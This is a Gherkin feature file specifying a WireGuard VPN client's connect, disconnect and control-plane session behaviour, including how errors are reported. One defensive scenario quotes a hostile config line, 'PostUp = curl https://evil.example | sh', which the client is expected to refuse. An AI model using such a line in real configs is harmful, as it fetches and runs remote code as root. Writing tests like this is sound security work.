Feature: Connecting this computer to the WireGuard server
  As someone who needs to reach internal services
  I want Connect to bring a working tunnel up, and Disconnect to take it down
  Whether I have a WireGuard config file or sign in to the control plane

  Background:
    Given wg-quick is installed

  Rule: With a WireGuard config file, no sign-in is needed

    Scenario: Connecting with an imported config
      Given I have imported the WireGuard config "office"
      When I connect
      Then the tunnel is up
      And wg-quick brought up exactly the config I imported
      And the status says "office" is "Connected"
      And the status mode is "direct"

    Scenario: Disconnecting
      Given I have imported the WireGuard config "office"
      And I am connected
      When I disconnect
      Then the tunnel is down
      And the status says "office" is "Ready"

    Scenario: Reconnecting while a tunnel is already up replaces it
      Given I have imported the WireGuard config "office"
      And I am connected
      When I connect
      Then wg-quick ran "down" and then "up"
      And the tunnel is up

    Scenario: A config that would run commands as root is refused
      When I import a WireGuard config containing "PostUp = curl https://evil.example | sh"
      Then it fails mentioning "root"
      And no profile is imported

    Scenario: A config with a typo is refused with the line number
      When I import a WireGuard config containing "Adress = 10.8.0.9/32"
      Then it fails mentioning "line 4"

    Scenario: The tunnel failing to come up is reported, not hidden
      Given I have imported the WireGuard config "office"
      And wg-quick will fail with "Unable to access interface: Operation not permitted"
      When I connect
      Then it fails mentioning "wg-quick"
      And the tunnel is down

  Rule: Signed in, the control plane issues the session

    Background:
      Given the control plane offers the network "Development"
      And I am signed in as "alice@example.com"

    Scenario: Connecting creates a session and brings the tunnel up
      When I connect
      Then the control plane issued a session for this device
      And the WireGuard config on disk is readable only by me
      And the tunnel is up
      And the status says "Development" is "Connected"
      And the status mode is "managed"

    Scenario: A tunnel that will not come up leaves the session visible
      Given wg-quick will fail with "boom"
      When I connect
      Then it fails mentioning "wg-quick"
      And the status says "Development" is "Session open, tunnel down"

    Scenario: Disconnect takes the tunnel down before releasing the session
      Given I am connected
      When I disconnect
      Then the tunnel is down
      And the control plane released the session
      And the tunnel went down before the session was released

    Scenario: A session the control plane refuses never touches the interface
      Given the control plane will refuse sessions with "posture: disk_encryption failing"
      When I connect
      Then it fails mentioning "create session"
      And wg-quick was never run

    Scenario: An unreachable control plane is reported
      Given the control plane is unreachable
      When I connect
      Then it fails mentioning "127.0.0.1"
      And wg-quick was never run
